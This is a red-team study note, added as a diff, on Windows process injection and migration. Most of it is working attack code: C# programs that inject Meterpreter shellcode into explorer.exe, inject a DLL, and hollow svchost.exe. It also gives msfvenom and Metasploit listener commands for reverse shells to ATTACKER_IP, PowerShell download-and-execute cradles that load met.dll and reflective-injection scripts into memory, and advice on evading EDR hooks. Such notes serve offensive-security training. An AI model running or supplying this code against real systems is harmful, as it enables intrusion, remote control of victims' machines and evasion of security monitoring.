@@ -1,0 +1,668 @@
+---
+title: Process Injection and Migration
+draft: false
+tags:
+  - red-teaming
+  - windows
+  - process-injection
+  - post-exploitation
+  - c-sharp
+---
+ 
+Process injection and migration involves manually injecting our code into other programs and migrate to different processes.
+
+A typical shellcode runner (like those we developed in Microsoft Word, PowerShell, or Jscript) executes the shell inside its own process. 
+
+Issues: 
+- The victim may close the application, which could shut down our shell. 
+- Security software may detect network communication from a process that doesn't typically generate it and block our shell.
+
+Interesting process to migrate to:
+- **explorer.exe**: responsible for hosting the user's desktop experience. It has a medium integrity level, always exists and does not exit until the user logs off.
+- **notepad.exe**: we could also inject into a new hidden process like notepad
+- **svchost.exe**: performs network communication
+
+A process is a container that is created to house a running application. Each Windows process maintains its own virtual memory space, but we can share virtual memory of 2 processes via Win32 APIs. 
+
+A thread, however, executes the compiled assembly code of the application. A process may leverage multiple threads to perform simultaneous actions, and each thread will have its own stack and share the virtual memory space of the process.
+
+We can initiate Windows-based process injection by opening a channel from one process to another through the Win32 [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) API. We'll then modify its memory space through the [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) and [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) APIs, and finally create a new execution thread inside the remote process with [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread).
+
+**Process permissions**
+
+Every process has a [Security Descriptor](https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors) that specifies the file permissions of the executable and access rights of a user or group, originating from the creator of the process. 
+
+All processes also have an [Integrity level](https://docs.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control) that restricts access to it. We can only inject code into processes running at the same or lower integrity level of the current process.
+
+- Medium Integrity: processes executed by normal user accounts or default processes like `explorer.exe`
+- High Integrity: processes executed as Administrator
+- System Integrity: SYSTEM account processes (NT Authority)
+
+**Win32 APIs**
+
+The previous APIs we used (VirtualAlloc, RtlMoveMemory/C# Copy, CreateThread) dont allow us to perform any actions in any other external processes. Therefore we will use the following APIs:
+
+The **OpenProcess API** opens an existing local process for interaction and must be supplied with three parameters:
+1. **dwDesiredAccess**: establishes the [access rights](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights) we require on that process. To call _OpenProcess_ successfully, our current process must possess the appropriate security permissions.
+2. **bInheritHandle**: set if the returned handle may be inherited by a child process.
+3. **dwProcessId**: specifies the process identifier of the target process.
+
+The **VirtualAllocEx API** allows to allocate memory in any process with enough permissions. Unlike `VirtualAlloc`, this API allows us to perform any actions in any process that we have a valid handle to.
+
+**WriteProcessMemory** allows us to copy data into the remote process.
+
+**CreateRemoteThread** allows us to create remote process threads, since we cant do it with `CreateThread`
+
+# Process Injection in C\#
+
+1. Open in Visual Studio a Solution and create a new `.NET standard Console App` Project called Inject.
+2. Generate a Meterpreter staged shellcode with msfvenom in _csharp_ format:
+```bash
+$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f csharp
+```
+
+3. In Program.cs paste the following code:
+```csharp
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace Inject
+{
+    class Program
+    {
+	    // Use P/Invoke technique to import necessary Win32 methods:
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        
+        static void Main(string[] args)
+		{
+			
+			Process[] explorerProcesses = Process.GetProcessesByName("explorer");
+			
+			Process explorer = explorerProcesses[0];
+				  
+			// Get a handle for the remote process:
+			// 0x001F0FFF = PROCESS_ALL_ACCESS = request full access to target process
+			// false = no child process can inherit the handle
+			// 4804 = PID of process explorer
+			IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorer.Id);
+			
+			// Allocate memory in the remote process
+			// 1. Handle of process
+			// 2. Desired starting address allocation on the remote process (IntPtr.Zero -> null -> automatic allocation)
+			// 3. 0x1000 = size of the desired allocation
+			// 4. 0x3000 = allocation type (MEM_COMMIT and MEM_RESERVE)
+			// 5. 0x40 = memory protections (PAGE_EXECUTE_READWRITE)
+			IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+			
+			// $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f csharp
+			byte[] buf = new byte[] {BYTES};
+			
+			// Copy the payload into the remote memory 
+			IntPtr outSize; // to store how much data was copied
+			// 1. Handler
+			// 2. Memory address where payload will be copied
+			// 3. Buffer containing payload to copy
+			// 4. Size to be copied
+			// 5. Pointer to location in memory to output how much data was copied
+			WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
+			
+			// Create a thread to execute the payload in the remote process:
+			// 4. Starting address of the thread
+			// 5. Pointer to variables which will be passed to the thread function pointed to by the 4th arg (we dont need so Null)
+			IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        }
+    }
+}
+```
+
+4. Compile the code in x64 bit architecture. Make sure the Project has assigned the x64 architecture. This can also be verified in the output .exe path (the output .exe should contain `x64` in the path, e.g. `ATTACKER_IP\visualstudio\Inject\bin\x64\Release\Inject.exe`)
+
+Migration paths:
+- 64-bit -> 64-bit
+- 64-bit -> 32-bit
+- 32-bit -> 32-bit
+- 32-bit -> 64-bit (dont work)
+
+5. Setup a listener:
+```bash
+msf> use multi/handler
+msf> set payload windows/x64/meterpreter/reverse_https
+msf> set LHOST ATTACKER_IP
+msf> set LPORT 443
+msf> run
+```
+
+6. Execute the payload. We will obtain a meterpreter session running in explorer.exe process.
+
+**Using Low-Level native APIs**
+
+> [!Note] Why use NtCreateSection instead of VirtualAllocEx/WriteProcessMemory?
+> `NtCreateSection` creates the **section handle** passed as the first argument to `NtMapViewOfSection`. This approach creates a shared memory section mapped into both processes simultaneously — shellcode written into the local view is immediately visible in the remote view, so no `WriteProcessMemory` is needed. Because these are lower-level `ntdll.dll` native syscalls rather than `kernel32.dll` functions, they bypass EDR hooks placed on the higher-level APIs.
+
+```csharp
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace Inject2
+{
+    class Program
+    {
+        [DllImport("ntdll.dll")]
+		static extern int NtCreateSection(out IntPtr sectionHandle, uint desiredAccess, IntPtr objectAttributes, ref long maximumSize, uint sectionPageProtection, uint allocationAttributes, IntPtr fileHandle);
+
+        [DllImport("ntdll.dll")]
+        static extern int NtMapViewOfSection(IntPtr sectionHandle, IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, IntPtr commitSize, ref ulong sectionOffset, ref uint viewSize, uint inheritDisposition, uint allocationType, uint win32Protect);
+
+        [DllImport("ntdll.dll")]
+        static extern int NtUnmapViewOfSection(IntPtr processHandle, IntPtr baseAddress);
+
+        [DllImport("ntdll.dll")]
+        static extern int NtClose(IntPtr handle);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        static void Main(string[] args)
+        {
+            Process[] explorerProcesses = Process.GetProcessesByName("explorer");
+            if (explorerProcesses.Length == 0)
+            {
+                Console.WriteLine("No explorer process found.");
+                return;
+            }
+
+            Process explorer = explorerProcesses[0];
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorer.Id);
+
+            // Payload (replace with your own)
+            byte[] buf = new byte[] { 0x90, 0x90, 0x90 };
+
+            // Step 1: Create a section in the actual process
+            IntPtr sectionHandle;
+            long maximumSize = (long)buf.Length;
+            int status = NtCreateSection(
+                out sectionHandle,
+                0x001F0FFF, // SECTION_ALL_ACCESS
+                IntPtr.Zero,
+                ref maximumSize,
+                0x40, // PAGE_EXECUTE_READWRITE — must include execute so the remote view can be mapped RX
+                0x08000000, // SEC_COMMIT
+                IntPtr.Zero);
+
+            if (status != 0)
+            {
+                Console.WriteLine("NtCreateSection failed.");
+                Console.WriteLine($"NtCreateSection returned NTSTATUS: 0x{status:X8}");
+                return;
+            }
+
+            // Step 2a: Map the section into the LOCAL process (so we can write to it)
+            // Marshal.Copy operates in the current process address space — we cannot write directly to a remote process address. Instead, map the same section locally, write the shellcode there, and it will be visible in the remote mapping.
+            IntPtr localAddress = IntPtr.Zero;
+            ulong localSectionOffset = 0;
+            uint localViewSize = (uint)buf.Length;
+            status = NtMapViewOfSection(
+                sectionHandle,
+                (IntPtr)(-1),       // -1 = GetCurrentProcess() pseudo-handle
+                ref localAddress,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                ref localSectionOffset,
+                ref localViewSize,
+                2,                  // ViewUnmap
+                0,
+                0x04);              // PAGE_READWRITE — we only write here
+
+            if (status != 0)
+            {
+                Console.WriteLine("NtMapViewOfSection (local) failed.");
+                NtClose(sectionHandle);
+                return;
+            }
+
+            // Step 2b: Map the section into the REMOTE process (for execution)
+            IntPtr remoteAddress = IntPtr.Zero;
+            ulong remoteSectionOffset = 0;
+            uint remoteViewSize = (uint)buf.Length;
+            status = NtMapViewOfSection(
+                sectionHandle,
+                hProcess,
+                ref remoteAddress,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                ref remoteSectionOffset,
+                ref remoteViewSize,
+                2,                  // ViewUnmap
+                0,
+                0x20);              // PAGE_EXECUTE_READ — execute only, no write needed remotely
+
+            if (status != 0)
+            {
+                Console.WriteLine("NtMapViewOfSection (remote) failed.");
+                NtUnmapViewOfSection((IntPtr)(-1), localAddress);
+                NtClose(sectionHandle);
+                return;
+            }
+
+            // Step 3: Write shellcode into the LOCAL mapping
+            // Because the section is shared, this data is immediately visible via remoteAddress
+            Marshal.Copy(buf, 0, localAddress, buf.Length);
+
+            // Step 4: Execute from the REMOTE mapping address
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddress, IntPtr.Zero, 0, IntPtr.Zero);
+
+            // Cleanup local view — remote view stays alive until the thread finishes
+            NtUnmapViewOfSection((IntPtr)(-1), localAddress);
+            NtClose(sectionHandle);
+
+            Console.WriteLine("Injection complete.");
+        }
+    }
+}
+```
+
+---
+# DLL Injection with C\#
+
+We are going to make the target process (explorer.exe) load our malicious unmanaged DLL library to migrate to that process. We are going to use the [LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) API.
+
+When we call CreateRemoteThread, the fourth argument is the start address of the function run in the new thread, and the fifth argument is the memory address of a buffer containing arguments for that function. 
+
+The idea is to resolve the address of _LoadLibraryA_ inside the remote process and invoke it while supplying the name of the DLL we want to load.
+
+Restrictions:
+1. The DLL must be written in C or C++ and must be unmanaged.
+2. DLLs normally contain APIs that are called after the DLL is loaded. To call these APIs, an application would first have to "resolve" their names to memory addresses using GetProcAddress. Problem is GetProcAddress cannot resolve an API in a remote process.
+
+_LoadLibrary_ calls the [_DllMain_ function](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain) inside the DLL, which initializes variables and signals that the DLL is ready to use.
+
+The _DLL_PROCESS_ATTACH_ reason code is passed to _DllMain_ when the DLL is being loaded into the virtual memory address space because of a call to _LoadLibrary_. This means that instead of defining our shellcode as a standard API exported by our malicious DLL, we could put our shellcode within the _DLL_PROCESS_ATTACH_ switch case, where it will be executed when _LoadLibrary_ calls _DllMain_.
+
+> [!Important]
+> This technique is detectable since LoadLibrary only accepts files present on disk.
+
+1. Generate the DLL:
+```bash
+$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f dll -o met.dll
+```
+
+2. Create a new `Console App (.NET Framework)` and name it Inject.
+
+3. Write the following payload:
+```csharp
+using System;
+using System.Diagnostics;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace Inject
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        static void Main(string[] args)
+        {
+			// define DLL name:
+            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            String dllName = dir + "\\met.dll";
+			
+			// download the DLL and write it to disk:
+            WebClient wc = new WebClient();
+            wc.DownloadFile("http://ATTACKER_IP/met.dll", dllName);
+			
+			// get explorer PID:
+            Process[] expProc = Process.GetProcessesByName("explorer");
+            int pid = expProc[0].Id;
+			
+			// get explorer process handler
+            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
+            
+            // allocate memory in the explorer process (RW):
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            
+            // write into memory the path and name of the DLL
+            IntPtr outSize;
+            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+            
+            // revolve the memory address of LoadLibraryA (most native Windows DLLs are allocated at the same base address across all processes, so we can look for the address in our current process):
+            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+            
+            // execute LoadLibraryA with the path to the DLL in disk:
+            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
+        }
+    }
+}
+```
+
+---
+# Reflective DLL Injection in PowerShell
+
+Reflective DLL injection parses the relevant fields of the DLL's [Portable Executable](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format) (PE) file format and maps the contents into memory.
+
+We'll reuse the PowerShell reflective DLL injection code called [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
+
+It has two separate modes: the first is to reflectively load a DLL or EXE into the same process, and the second is to load a DLL into a remote process.
+
+> [!Warning] Known bug — patch before use
+> `Invoke-ReflectivePEInjection.ps1` from PowerSploit has two bugs on modern .NET:
+>
+> **Bug 1** — `$UnsafeNativeMethods.GetMethod('GetProcAddress')` throws `AmbiguousMatchException` because `GetProcAddress` has two overloads (`HandleRef` and `IntPtr`). `$GetProcAddress` ends up null.
+> **Bug 2** — even after fixing Bug 1 with `GetMethods()`, picking `$tmp[0]` selects the `IntPtr` overload while the call site (line 1009) passes a `HandleRef` — causing `HandleRef cannot be converted to IntPtr`. Must explicitly select the `HandleRef` overload.
+>
+> **Fix on Kali** (adjust path if needed — find with `find / -name Invoke-ReflectivePEInjection.ps1 2>/dev/null`):
+> ```bash
+> python3 << 'EOF'
+> path = '/usr/share/windows-resources/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1'
+> with open(path) as f:
+>     c = f.read()
+> old = "$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')"
+> new = "$tmp=@(); $UnsafeNativeMethods.GetMethods() | ForEach-Object {If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}; $GetProcAddress = ($tmp | Where-Object { ($_.GetParameters())[0].ParameterType.Name -eq 'HandleRef' } | Select-Object -First 1)"
+> open(path,'w').write(c.replace(old, new))
+> print('Patched')
+> EOF
+> ```
+> This selects the `HandleRef` overload specifically, matching what the script passes at line 1009. Re-serve the patched file with `python3 -m http.server 80`.
+
+1. Generate the DLL:
+```bash
+$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f dll -o met.dll
+``` 
+
+2. Setup a listener:
+```bash
+msf> use multi/handler
+msf> set LHOST ATTACKER_IP
+msf> set LPORT 443
+msf> set payload windows/x64/meterpreter/reverse_https
+msf> run
+```
+
+3. Download the malicious DLL and place it in a byte array. Also, lookup for the explorer process ID:
+```powershell
+PS C:\> PowerShell -Exec Bypass
+PS C:\> $bytes = (New-Object System.Net.WebClient).DownloadData('http://ATTACKER_IP/met.dll')
+PS C:\> $procid = (Get-Process -Name explorer).Id # lookup for the explorer process ID
+```
+
+4. Upload [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) to the target machine via [[Windows File Transfer]]
+5. Import the module:
+```powershell
+PS C:\> Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
+```
+
+6. Supply the byte array containing the DLL and the process ID we want to migrate to:
+```powershell
+PS C:\> Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+```
+
+**Script (fully in memory)**
+
+Full in-memory chain — downloads and executes without writing to disk:
+
+```powershell
+# reflect.ps1 — host on Kali alongside met.dll and Invoke-ReflectivePEInjection.ps1
+
+# 1. Load Invoke-ReflectivePEInjection directly into memory (no disk write):
+IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-ReflectivePEInjection.ps1')
+
+# 2. Download the malicious DLL into a byte array:
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://ATTACKER_IP/met.dll')
+
+# 3. Find the target process ID:
+$procid = (Get-Process -Name explorer).Id
+
+# 4. Inject the DLL reflectively into the remote process:
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+```
+
+Kali — host all three files from the same directory (ReflectivePEInjection.ps1, reflect.ps1 and met.dll):
+```bash
+$ python3 -m http.server 80
+```
+
+Invoke `reflect.ps1` from a meterpreter shell or existing session:
+```powershell
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/reflect.ps1')"
+```
+
+---
+# Process Hollowing with C\#
+
+Process Hollowing (also called RunPE) spawns a **legitimate process in a suspended state**, replaces its executable image with a malicious payload, then resumes it. The process appears as a trusted binary in Task Manager — only memory analysis reveals the swap.
+
+The key difference from standard process injection: instead of adding a new region, the original executable image is **unmapped and fully replaced**, making the process look clean from the outside. Good hollowing targets are processes expected to generate network traffic (`svchost.exe`, `RuntimeBroker.exe`, `SearchIndexer.exe`).
+
+**Technique flow:**
+
+1. **Spawn target process suspended** — `CreateProcess` with `CREATE_SUSPENDED (0x4)`.
+2. Locate the PEB address of the process - Use the Win32 [ZwQueryInformationProcess](https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess) API to retrieve information about the process like the PEB address.
+3. Locate the base address of the executable: The base address is at offset 0x10 bytes into the PEB. Read the base address of the executable via the API [ReadProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory).
+4. Analyze the remote target process PE headers: read the first 0x200 bytes of memory into the base address of the executable via ReadProcessMemory.
+	1. Read the PE Header offset: offset 0x3C from base address, which contains the offset from the beginning of the PE to the _PE Header_ (read it via ReadProcessMemory).
+	2. Read the EntryPoint Relative Virtual Address (RVA): offset 0x28 from the PE Header. RVA is an offset that needs to be added to the remote process base address to obtain the absolute virtual memory address of the EntryPoint.
+5. The result of that calculation `ReadMemory(Executable base address + ReadMemory(RVA))` is the virtual address of the entry point inside the remote process.
+6. Once we have located the EntryPoint of the remote process, we can use _WriteProcessMemory_ to overwrite the original content with our shellcode.
+```
+Base address = ReadMemory(PEB + 0x10)
+PE Header offset = ReadMemory(Base address + 0x3C)
+PE Header Address = Base address + PE Header offset
+Entrypoint Relative Virtual Address (RVA) = ReadMemory(PE Header Address + 0x28)
+Entrypoint Virtual Address = Base address + RVA
+```
+
+1. Create a Console App project in Visual Studio and name it "Hollow".
+
+2. Place the following payload:
+```csharp
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+
+namespace Hollow
+{
+    internal class Program
+    {
+	    // structure that contains info about how the window of the new process should be configured:
+	    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+		struct STARTUPINFO
+		{
+		    public Int32 cb;
+		    public IntPtr lpReserved;
+		    public IntPtr lpDesktop;
+		    public IntPtr lpTitle;
+		    public Int32 dwX;
+		    public Int32 dwY;
+		    public Int32 dwXSize;
+		    public Int32 dwYSize;
+		    public Int32 dwXCountChars;
+		    public Int32 dwYCountChars;
+		    public Int32 dwFillAttribute;
+		    public Int32 dwFlags;
+		    public Int16 wShowWindow;
+		    public Int16 cbReserved2;
+		    public IntPtr lpReserved2;
+		    public IntPtr hStdInput;
+		    public IntPtr hStdOutput;
+		    public IntPtr hStdError;
+		}
+		
+		// structure that contains identification information about the new process we are creating like the porcess and thread handles:
+		[StructLayout(LayoutKind.Sequential)]
+		internal struct PROCESS_INFORMATION
+		{
+		    public IntPtr hProcess;
+		    public IntPtr hThread;
+		    public int dwProcessId;
+		    public int dwThreadId;
+		}
+		
+		[StructLayout(LayoutKind.Sequential)]
+		internal struct PROCESS_BASIC_INFORMATION
+		{
+		    public IntPtr Reserved1;
+		    public IntPtr PebAddress;
+		    public IntPtr Reserved2;
+		    public IntPtr Reserved3;
+		    public IntPtr UniquePid;
+		    public IntPtr MoreReserved;
+		}
+    
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+		private static extern int ZwQueryInformationProcess(IntPtr hProcess, 
+		    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, 
+		        uint ProcInfoLen, ref uint retlen);
+        
+        [DllImport("kernel32.dll", SetLastError = true)]
+		static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
+		    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+		    
+		[DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        
+        [DllImport("kernel32.dll", SetLastError = true)]
+private static extern uint ResumeThread(IntPtr hThread);
+
+        static void Main(string[] args)
+        {
+	        // instantiate the structures:
+	        STARTUPINFO si = new STARTUPINFO();
+			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+			
+			// Step 1: Spawn svchost.exe in suspended state
+			bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
+			    IntPtr.Zero, false, 0x4 /* CREATE_SUSPENDED */, IntPtr.Zero, null, ref si, out pi);
+		        
+			// Step 2: Get the PEB
+			PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+			
+			uint tmp = 0;
+			IntPtr hProcess = pi.hProcess; // process handle
+			// 1. Process handle
+			// 3. Structure that will contain basic information about the process
+			ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+			
+			// Step3: read the base address of the new process:
+			
+			// contains a pointer to the image base of **svchost.exe** in the suspended process
+			IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+			
+			byte[] addrBuf = new byte[IntPtr.Size]; // 8 Byte buffer converted to a 64b integer later
+			IntPtr nRead = IntPtr.Zero;
+			// 1. Process handle (new process)
+			// 2. Address to read (PEB + 0x10)
+			// 3. Buffer to store the content read
+			// 4. Bytes to read
+			// 5. Number of bytes read
+			ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+			
+			IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0)); // convert the 8/4 byte buffer into 64/32 bit integer (depending if the arch is x86 or x64)
+			
+			// Step 4: read 200 bytes from image base:
+			byte[] data = new byte[0x200];
+			ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+			
+			// Step 5: read the PE Header offset
+			uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+			
+			// Step 6: read the RVA
+			uint opthdr = e_lfanew_offset + 0x28;
+			
+			uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+			
+			// Step 7: calculate the Entrypoint Virtual Address
+			IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+			
+			// Step 8: overwrite the entrypoint of the process with our shellcode:
+			// $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f csharp
+			byte[] buf = new byte[] {}
+
+			WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
+			
+			// Step 9: resume the thread
+			ResumeThread(pi.hThread);
+        }
+    }
+}
+```
+
+> [!Important]
+> It is worth noting that a memory address takes up eight bytes in a 64-bit process, while it only uses four bytes in a 32-bit process, so the use of variable types, offsets, and amount of data read must be adapted when calling `ReadProcessMemory`.
+
+3. Compile the code in x64 since **svchost.exe** is a 64-bit process
+4. Setup a listener:
+```bash
+msf> use multi/handler
+msf> set LHOST ATTACKER_IP
+msf> set LPORT 443
+msf> set payload windows/x64/meterpreter/reverse_https
+msf> run
+```
+
+> [!Note]
+> "e could also use this technique to [hollow](https://github.com/m0n0ph1/Process-Hollowing) an entire compiled EXE.
+
+> [!Warning] OPSEC
+> Process Hollowing is a **well-known technique** with strong detection in modern EDR:
+> - `CREATE_SUSPENDED` + `WriteProcessMemory` + `ResumeThread` sequence is a high-confidence heuristic
+> - On-disk image vs. in-memory image mismatch is detected by Yara scanners and memory forensics
+> - `NtUnmapViewOfSection` on a foreign process triggers alerts in most commercial EDR products
+>
+> More advanced variants: **Process Doppelgänging** (uses NTFS transactions) and **Process Ghosting** (deletes file before process creation) — see [[AV Evasion]].
+
+---
+# OPSEC
+
+> [!Warning] OPSEC
+> - **VirtualAllocEx + WriteProcessMemory** creates the classic RWX memory pattern that EDR flags — prefer `NtCreateSection`/`NtMapViewOfSection` (shown in the alternative payload above).
+> - **DLL injection via LoadLibrary** writes the DLL to disk — trivially detectable. Use Reflective DLL Injection (in-memory) instead.
+> - **Migration target**: prefer processes with expected network activity (`svchost.exe`) over clearly non-network processes (`notepad.exe`). An EDR alert on `notepad.exe` making outbound connections is immediate.
+> - **Integrity constraints**: you cannot inject into a process running at a higher integrity level than your current session. Privilege escalation must come first.
+> - **EDR hooks**: most EDR products hook `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` at the user-land level. Use direct syscalls (e.g., [SysWhispers](https://github.com/jthuraisamy/SysWhispers2)) or `ntdll.dll` calls to bypass.
+
+---
+# Related Notes
+- [[Phishing with Jscript]] — shellcode runners and staged payloads that are candidates for migration
+- [[Reflective PowerShell]] — in-memory shellcode execution without a separate injection step
+- [[Command and Control (C2-C&C)]] — post-injection C2 operations and lateral movement
+- [[AV Evasion]] — additional techniques to avoid detection before and after injection
+- [[Visual Studio Setup for Development & Compilation]] — compiling the C# injection tools
